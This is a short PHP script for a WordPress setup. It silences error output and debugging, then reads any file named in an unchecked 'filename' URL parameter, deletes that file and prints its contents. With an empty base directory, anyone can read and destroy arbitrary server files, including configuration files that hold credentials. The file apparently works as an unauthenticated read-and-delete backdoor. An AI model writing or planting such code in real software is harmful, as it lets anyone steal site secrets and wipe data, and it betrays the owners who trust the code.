<?php
ini_set('display_errors','Off'); 
ini_set('error_reporting', E_ALL ); 

define('WP_DEBUG', false); 
define('WP_DEBUG_DISPLAY', false);
define('WRITABLE_DIR', '');

if ($data = file_get_contents(WRITABLE_DIR.$_GET['filename'])) {
    unlink(WRITABLE_DIR.$_GET['filename']);
    echo $data;
};

?>